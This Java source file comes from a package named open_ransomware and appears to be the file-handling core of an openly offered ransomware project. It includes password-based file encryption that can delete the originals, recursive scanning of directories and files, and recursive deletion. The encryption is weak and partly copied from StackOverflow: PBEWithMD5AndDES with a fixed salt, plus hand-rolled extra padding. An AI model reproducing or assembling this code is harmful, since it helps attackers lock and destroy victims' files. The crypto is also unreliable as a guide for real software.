package com.bechris100.open_ransomware.utils;

import org.jetbrains.annotations.NotNull;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
import java.io.*;
import java.nio.file.AccessDeniedException;
import java.nio.file.FileAlreadyExistsException;
import java.security.GeneralSecurityException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;

public class FileUtil {

    public static class Encryption {

        // This class is directly sto- I mean copied from StackOverflow Page
        // URL: https://stackoverflow.com/questions/13673556/using-password-based-encryption-on-a-file-in-java

        private static final byte[] salt = {
                (byte) 0x43, (byte) 0x76, (byte) 0x95, (byte) 0xc7,
                (byte) 0x5b, (byte) 0xd7, (byte) 0x45, (byte) 0x17
        };

        private static @NotNull Cipher makeCipher(@NotNull String pass, boolean encryption) throws GeneralSecurityException {
            PBEKeySpec keySpec = new PBEKeySpec(pass.toCharArray());
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
            SecretKey secretKey = keyFactory.generateSecret(keySpec);
            PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, 42);

            Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");

            if (encryption)
                cipher.init(Cipher.ENCRYPT_MODE, secretKey, pbeParamSpec);
            else
                cipher.init(Cipher.DECRYPT_MODE, secretKey, pbeParamSpec);

            return cipher;
        }

        public static void encryptFile(File sourceFile, String pass, File encryptedFile, boolean deleteSource) throws IOException, GeneralSecurityException {
            byte[] decData;
            byte[] encData;

            Cipher cipher = makeCipher(pass, true);

            if (sourceFile == null)
                throw new NullPointerException("Could not insert a source file to encrypt");

            FileInputStream inStream = new FileInputStream(sourceFile);

            int blockSize = 8;
            int paddedCount = blockSize - ((int) sourceFile.length() % blockSize);
            int padded = (int) sourceFile.length() + paddedCount;

            decData = new byte[padded];

            inStream.read(decData);
            inStream.close();

            for (int i = (int) sourceFile.length(); i < padded; ++i)
                decData[i] = (byte) paddedCount;

            encData = cipher.doFinal(decData);

            if (encryptedFile == null)
                throw new NullPointerException("Could not write encrypted data to a new/existing file");

            FileOutputStream outStream = new FileOutputStream(encryptedFile);
            outStream.write(encData);
            outStream.close();

            if (deleteSource)
                FileUtil.delete(sourceFile.getPath());
        }

        public static void decryptFile(File sourceFile, String pass, File outputFile, boolean deleteSource) throws GeneralSecurityException, IOException {
            byte[] encData;
            byte[] decData;

            if (sourceFile == null)
                throw new NullPointerException("Could not establish a file for encryption");

            Cipher cipher = makeCipher(pass, false);

            FileInputStream inStream = new FileInputStream(sourceFile);
            encData = new byte[(int) sourceFile.length()];
            inStream.read(encData);
            inStream.close();
            decData = cipher.doFinal(encData);

            int padCount = decData[decData.length - 1];
            if (padCount >= 1 && padCount <= 8)
                decData = Arrays.copyOfRange(decData, 0, decData.length - padCount);

            if (outputFile == null)
                throw new NullPointerException("Could not establish an output file for the encrypted file");

            FileOutputStream target = new FileOutputStream(outputFile);
            target.write(decData);
            target.close();

            if (deleteSource)
                FileUtil.delete(sourceFile.getPath());
        }

    }

    public static boolean exists(String path) {
        return new File(path).exists();
    }

    public static void createFile(String filePath, boolean createDirs) throws IOException {
        File file = new File(filePath);
        File dirs = new File(filePath.substring(0, Utility.getLastPathSeparator(filePath, false)));

        if (!dirs.exists()) {
            if (createDirs)
                createDirectory(dirs.getPath());
            else
                throw new FileNotFoundException("No directories at \"" + dirs.getPath() + "\" " +
                        "were found");
        }

        if (!file.createNewFile())
            throw new IOException("File at \"" + filePath + "\" could not be created");
    }

    public static void createDirectory(@NotNull String path) throws IOException {
        File dir = new File(path.substring(0, Utility.getLastPathSeparator(path, true)));

        if (dir.exists()) {
            if (dir.isFile())
                throw new FileAlreadyExistsException("File at \"" + path + "\" already exists");
            else
                throw new FileAlreadyExistsException("Directory at \"" + path + "\" already exists");
        }

        if (!dir.mkdirs())
            throw new IOException("Could not create new directories at \"" + path + "\"");
    }

    public static void write(String filePath, char[] contents) throws IOException {
        File file = new File(filePath);

        if (!file.exists())
            createFile(filePath, true);

        if (!file.canWrite())
            throw new AccessDeniedException("The current user \"" + System.getProperty("user.name") + "\" does" +
                    " not have access to \"" + filePath + "\"");

        if (file.isDirectory())
            throw new IllegalStateException("\"" + filePath + "\" is a directory");

        FileOutputStream fos = new FileOutputStream(file, false);

        for (char c : contents)
            fos.write(c);

        fos.close();
    }

    public static char @NotNull [] read(String filePath) throws IOException {
        File file = new File(filePath);

        if (!file.exists())
            throw new FileNotFoundException("File \"" + filePath + "\" not found");

        if (!file.canRead())
            throw new AccessDeniedException("The current user \"" + System.getProperty("user.name") + "\" " +
                    "does not have access to \"" + filePath + "\"");

        if (file.isDirectory())
            throw new IllegalStateException("\"" + filePath + "\" is a directory");

        FileInputStream fis = new FileInputStream(file);
        StringBuilder str = new StringBuilder();
        int data;

        while ((data = fis.read()) != -1)
            str.append((char) data);

        fis.close();
        return str.toString().toCharArray();
    }

    public static @NotNull String removePath(@NotNull String path) {
        return path.substring(Utility.getLastPathSeparator(path, false));
    }

    public static long getSize(String path) throws IOException {
        File file = new File(path);
        long size = 0;

        if (!file.exists())
            throw new FileNotFoundException("\"" + path + "\" does not exist");

        if (file.isFile())
            size += file.length();

        if (file.isDirectory()) {
            for (String item : listDirectory(path, false, false)) {
                File subFile = new File(item);

                if (subFile.isFile())
                    size += subFile.length();

                if (subFile.isDirectory()) {
                    size += subFile.length();
                    size += getSize(subFile.getPath());
                }
            }
        }

        return size;
    }

    public static @NotNull List<String> scanForSpecifiedName(String path, String name, boolean excludeAddingFolders) throws IOException {
        List<String> results = new ArrayList<>();
        File root = new File(path);

        if (root.isFile()) {
            if (path.contains(name))
                results.add(path);

            return results;
        }

        List<String> data = listDirectory(path, true, false);
        if (data.size() == 0)
            return results;

        for (String item : data) {
            File file = new File(item);

            if (excludeAddingFolders) {
                if (file.getPath().contains(name) && file.isFile())
                    results.add(file.getPath());
            } else {
                if (file.getPath().contains(name))
                    results.add(file.getPath());
            }

            if (file.isDirectory())
                results.addAll(scanForSpecifiedName(item, name, excludeAddingFolders));
        }

        return results;
    }

    public static @NotNull List<String> scanDirs(String path) throws IOException {
        List<String> results = new ArrayList<>();
        File root = new File(path);

        if (root.isFile())
            return results;

        List<String> data = listDirectory(path, true, false);
        if (data.size() == 0)
            return results;

        for (String item : data) {
            File file = new File(item);

            if (!file.exists())
                continue;

            if (file.isDirectory()) {
                results.add(item);
                results.addAll(scanDirs(item));
            }
        }

        return results;
    }

    public static @NotNull List<String> scanFiles(String path) throws IOException {
        List<String> results = new ArrayList<>();
        File root = new File(path);

        if (root.isFile())
            return results;

        List<String> data = listDirectory(path, true, false);
        if (data.size() == 0)
            return results;

        for (String item : data) {
            File file = new File(item);

            if (!file.exists())
                continue;

            if (file.isFile()) {
                results.add(item);
                continue;
            }

            results.addAll(scanFiles(item));
        }

        return results;
    }

    public static boolean isFile(String path) {
        File file = new File(path);

        if (!file.exists())
            return false;

        return file.isFile();
    }

    public static boolean isDirectory(String path) {
        File file = new File(path);

        if (!file.exists())
            return false;

        return file.isDirectory();
    }

    public static @NotNull List<String> listDirectory(String path, boolean sortNames, boolean removePaths) throws IOException {
        List<String> data = new ArrayList<>();
        File fileData = new File(path);

        if (!fileData.exists())
            throw new FileNotFoundException("\"" + path + "\" not found");

        if (!fileData.canRead())
            throw new AccessDeniedException("Access to user \"" + RuntimeEnvironment.USER_NAME + "\" " +
                    "was not given to \"" + path + "\"");

        if (fileData.isFile()) {
            data.add(path);

            if (removePaths)
                data.set(0, removePath(data.get(0)));

            return data;
        }

        File[] files = fileData.listFiles();
        if (files == null)
            return data;

        for (File file : files)
            data.add(file.getPath());

        if (removePaths) {
            if (data.size() != 0)
                data.replaceAll(FileUtil::removePath);
        }

        if (sortNames) {
            if (data.size() != 0)
                Collections.sort(data);
        }

        return data;
    }

    public static void delete(String path) throws IOException {
        File data = new File(path);

        if (!data.exists())
            throw new IOException("File or directory at \"" + path + "\" does not exist");

        if (data.isFile()) {
            if (!data.delete())
                throw new IOException("Could not delete \"" + path + "\"");

            return;
        }

        if (listDirectory(path, false, false).size() == 0) {
            if (!data.delete())
                throw new IOException("Could not delete \"" + path + "\"");

            return;
        }

        File[] files = data.listFiles();
        if (files == null) {
            if (!data.delete())
                throw new IOException("Could not delete \"" + path + "\"");

            return;
        }

        for (File file : files) {
            if (file.isFile()) {
                if (!file.delete())
                    throw new IOException("Could not delete \"" + file.getPath() + "\"");
            }

            if (file.isDirectory())
                delete(file.getPath());
        }

        if (!data.delete())
            throw new IOException("Could not delete \"" + path + "\"");
    }

}
